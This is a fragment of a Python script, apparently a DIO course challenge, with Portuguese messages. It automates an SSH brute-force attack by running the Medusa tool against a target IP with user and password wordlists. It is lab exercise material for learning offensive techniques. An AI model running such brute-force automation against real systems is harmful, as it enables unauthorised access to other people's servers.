...
def executar_medusa_ssh(target_ip):
    """Executa o comando Medusa para o serviço SSH."""
    print("\n==================================================")
    print("📢 ETAPA DE EXECUÇÃO DO MEDUSA (SSH) INICIADA 📢")
    print(f"🚀 Executando Força Bruta SSH contra {target_ip}...")
    print("==================================================")

    medusa_command = ["medusa", "-h", target_ip, "-U", USERS_FILE, "-P", PASS_FILE, "-M", "ssh", "-t", "6"]
...
def main():
    print("--- 💻 Desafio DIO: Automação de Força Bruta SSH (Python) ---")
